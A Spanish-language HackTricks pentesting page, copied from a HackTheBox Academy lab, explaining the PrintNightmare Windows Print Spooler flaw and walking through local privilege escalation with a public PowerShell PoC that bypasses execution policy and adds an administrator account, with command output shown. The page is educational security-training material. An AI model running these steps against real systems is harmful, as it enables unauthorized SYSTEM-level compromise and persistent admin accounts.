# PrintNightmare

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Esta página fue copiada de** [**https://academy.hackthebox.com/module/67/section/627**](https://academy.hackthebox.com/module/67/section/627)****

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` es una falla en [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) que se utiliza para permitir la impresión remota y la instalación de controladores. \
Esta función está destinada a dar a los **usuarios con el privilegio de Windows `SeLoadDriverPrivilege`** la capacidad de **agregar controladores** a un Spooler de impresión remoto. Este derecho generalmente está reservado para usuarios en el grupo de Administradores incorporados y Operadores de impresión que pueden tener una necesidad legítima de instalar un controlador de impresora en la máquina de un usuario final de forma remota.

La falla permitió que **cualquier usuario autenticado agregara un controlador de impresión** a un sistema Windows sin tener el privilegio mencionado anteriormente, lo que permite a un atacante la ejecución remota completa de **código como SYSTEM** en cualquier sistema afectado. La falla **afecta a todas las versiones admitidas de Windows**, y dado que el **Spooler de impresión** se ejecuta de forma predeterminada en **Controladores de dominio**, Windows 7 y 10, y a menudo se habilita en servidores Windows, esto presenta una superficie de ataque masiva, de ahí "pesadilla".

Microsoft lanzó inicialmente un parche que no solucionó el problema (y la guía inicial fue deshabilitar el servicio Spooler, lo que no es práctico para muchas organizaciones), pero lanzó un segundo [parche](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) en julio de 2021 junto con la guía para verificar que la configuración específica del registro esté establecida en `0` o no definida.&#x20;

Una vez que se hizo pública esta vulnerabilidad, se lanzaron exploits de PoC bastante rápido. **** [**Esta**](https://github.com/cube0x0/CVE-2021-1675) **versión** de [@cube0x0](https://twitter.com/cube0x0) se puede utilizar para **ejecutar un DLL malicioso** de forma remota o local utilizando una versión modificada de Impacket. El repositorio también contiene una **implementación en C#**.\
Este **** [**script de PowerShell**](https://github.com/calebstewart/CVE-2021-1675) **** se puede utilizar para una rápida escalada de privilegios local. Por **defecto**, este script **agrega un nuevo usuario administrador local**, pero también podemos suministrar una DLL personalizada para obtener una shell inversa o similar si agregar un usuario administrador local no está dentro del alcance.

### **Comprobando el servicio Spooler**

Podemos comprobar rápidamente si el servicio Spooler está en ejecución con el siguiente comando. Si no está en ejecución, recibiremos un error de "la ruta no existe".
```
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```
### **Añadiendo un administrador local con el PoC de PrintNightmare PowerShell**

Comience por [bypass](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) la política de ejecución en el host objetivo:
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
Ahora podemos importar el script de PowerShell y usarlo para agregar un nuevo usuario administrador local.
```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```
### **Confirmación de Nuevo Usuario Administrador**

Si todo ha ido según lo planeado, tendremos un nuevo usuario administrador local bajo nuestro control. Agregar un usuario es "ruidoso", no querríamos hacer esto en un compromiso donde la discreción es importante. Además, deberíamos verificar con nuestro cliente para asegurarnos de que la creación de cuentas esté dentro del alcance de la evaluación.
```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
